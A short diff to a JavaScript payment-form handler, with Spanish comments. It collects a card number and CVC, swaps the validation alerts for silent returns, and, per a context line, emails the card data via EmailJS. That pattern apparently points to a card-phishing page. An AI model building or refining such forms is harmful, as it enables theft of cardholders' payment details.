@@ -13,15 +13,13 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
         cvc: this.querySelector('input[type="text"]:last-child').value // CVC
     };
 
-    // Validaciones
+    // Validaciones sin alertas
     if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
-        alert('El número de tarjeta debe tener 16 dígitos.');
-        return;
+        return; // Si el número de tarjeta no es válido, no hace nada
     }
 
     if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
-        alert('El código CVC debe tener 3 dígitos.');
-        return;
+        return; // Si el CVC no es válido, no hace nada
     }
 
     // Envía los datos a tu correo usando EmailJS
